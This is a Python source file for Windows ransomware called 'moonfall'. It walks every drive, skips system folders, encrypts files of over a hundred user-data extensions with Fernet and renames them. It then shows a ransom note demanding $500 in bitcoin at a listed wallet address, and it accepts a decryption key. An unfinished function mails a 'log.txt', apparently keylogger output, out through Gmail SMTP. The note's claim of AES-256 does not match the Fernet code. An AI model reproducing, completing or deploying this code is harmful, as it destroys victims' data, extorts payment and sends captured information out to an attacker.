import os
from cryptography.fernet import Fernet
import PySimpleGUI as sg
import win32security
import ntsecuritycon as con
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import datetime
import oschmod
import sys
import platform
import win32api
import subprocess
import ctypes


"""
    General purpose variables
"""


brand_name='.moonfall'
protected_folders = ['Content.IE5', 'Temporary Internet Files', 'AppData', 'Program Files (x86)', 'Program Files', 'ProgramData', 'Intel', '$\\', 'Local Settings', 'Windows', 'ransomware', 'Boot', 'System Volume Information']
to_avoid_extensions = ['.moonfall', '.dll', '.exe']
target_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst','.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', 
  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot','.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', 
  '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ',
  '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif','.tiff', '.nef', '.psd', '.ai', 
  '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb','.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
  '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
  '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']


"""
    #TODO Keylogger method should be adapted
"""
def send_key_by_mail(sender, sender_password, reciever):
    server = 'smtp.gmail.com'
    port = 587

    date = datetime.datetime.now()
    date = date.strftime("%c")

    msg = MIMEMultipart("alternative")
    msg["Subject"] = 'Log of ' + date
    msg["From"] = sender
    msg["To"] = reciever

    msg.attach(MIMEText('Download the file', 'plain'))
    attach_file_name = 'log.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)  # encode the attachment

    payload.add_header('Content-Decomposition',
                       'attachment', filename=attach_file_name)
    msg.attach(payload)

    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()
    s.login(sender, sender_password)
    s.sendmail(sender, reciever, msg.as_string())
    s.quit()


"""
    Get file extension
"""
def getExtension(filename):
    _filename, file_extension = os.path.splitext(filename)
    return file_extension

    
"""
    Generate the key using Fernet module
"""
def write_key():
    key = Fernet.generate_key()

    with open('key.key', 'wb') as key_file:
        key_file.write(key)


"""
    Load the generated key
"""
def load_key():
    return open("key.key", "rb").read()


"""
    Save the data checking permissions
"""
def save_data(filename, data, opt='add_ext'):
    if not os.access(filename, os.W_OK):
        oschmod.set_mode(filename, "a+rwx,g-w,o-x")
        if not os.access(filename, os.W_OK):
            raise PermissionError("Write permissions can't be modified")
        
    with open(filename, 'wb') as file:
        file.write(data)

    if opt == 'add_ext':
        os.rename(filename, filename + brand_name)
    elif opt == 'del_ext':
        os.rename(filename, filename[:-len(brand_name)]) # TODO hay un problema con el añadir y eliminar la extension
    else:
        raise ValueError('Invalid argument')


"""
    Load the data and enables permissions
"""
def load_data(filename):
    if not os.access(filename, os.R_OK):
        oschmod.set_mode(filename, "a+rwx,g-w,o-x")
        if not os.access(filename, os.R_OK):
            raise PermissionError("Read permisions can't be modified")
        
    with open(filename, 'rb') as file:
        return file.read()

"""
    Function to encrypt or decrypt the data using the key
"""
def encrypt_or_decrypt(filename, key, opt='encrypt'):
    try:
        f = Fernet(key)
        data = load_data(filename)
        if opt == 'encrypt':
            encrypted_data = f.encrypt(data)
            save_data(filename, encrypted_data)
        elif opt == 'decrypt':
            decrypted_data = f.decrypt(data)
            save_data(filename, decrypted_data, 'del_ext')
        else:
            raise ValueError('Invalid argument')

    except ValueError as ve:
        if opt == 'decrypt':
            sg.theme('DarkPurple5')
            sg.Popup('Wrong key', keep_on_top=True, no_titlebar=True)
            raise Exception('Wrong key')
        else:
            print(ve)
            
    except IOError as ioe:
        print(ioe)
        
    except PermissionError as pe:
        print(pe)



if __name__ == '__main__':
    if platform.system() != 'Windows': # Checking host os
        sys.exit()
        
    write_key()
    key = load_key()

    local_drives = win32api.GetLogicalDriveStrings() # Cheking drives connected
    local_drives = local_drives.split('\000')[:-1]
    
    # Iterative algorithm TODO Inefficient O(n^3)
    for ld in local_drives:
        for root, dirs, files in os.walk(ld):
            [dirs.remove(d) for d in list(dirs) if d in protected_folders]
            for fn in files:
                full_path = root + os.sep + fn
                ext=getExtension(full_path)
                if ext in target_extensions and ext not in to_avoid_extensions:
                    print(full_path)
                    encrypt_or_decrypt(full_path, key)

    # Show Ransom note
    sg.theme('DarkRed2')
    layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
               [sg.Text('')],
               [sg.Text('How can I recover my files?', font='bold')],
               [sg.Text('You must have to pay the 500$ ransom in bitcoins.',
                        font='Helvetica 13')],
               [sg.Text('Once you do the payment, we will send the decryption key via mail.',
                        font='Helvetica 13')],
               [sg.Text(
                   'Payment must be done through Bitcoin wallet to the following BTC address:', font='Helvetica 13')],
               [sg.Text('1BhKDQDY55XMPqnSUDtCMCG8R6UX7CSbzP', font='bold')],
               [sg.Text('')],
               [sg.Text('')],
               [sg.Text(
                   'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
               [sg.InputText()],
               [sg.Text('')],
               [sg.Button('Decrypt files')]]

    window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')

    count = 0

    while True:
        try:
            event, values = window.read()
            key = values[0]

            # TODO Inefficient
            for ld in local_drives:
                for root, dirs, files in os.walk(ld):
                    [dirs.remove(d) for d in list(dirs) if d in protected_folders]
                    for fn in files:
                        full_path = root + os.sep + fn
                        try:
                            ext=getExtension(full_path)
                            if ext == brand_name:
                                encrypt_or_decrypt(full_path, key, opt='decrypt')
                                count += 1
                        except Exception as e:
                            print(e)
                            break
            if count > 0:
                break
        except Exception as e:
            print(e)

    window.close()

    sg.theme('DarkPurple5')
    sg.Popup("All data was decrypted successfully. Be careful on the internet next time ;)",
             keep_on_top=True, no_titlebar=True)
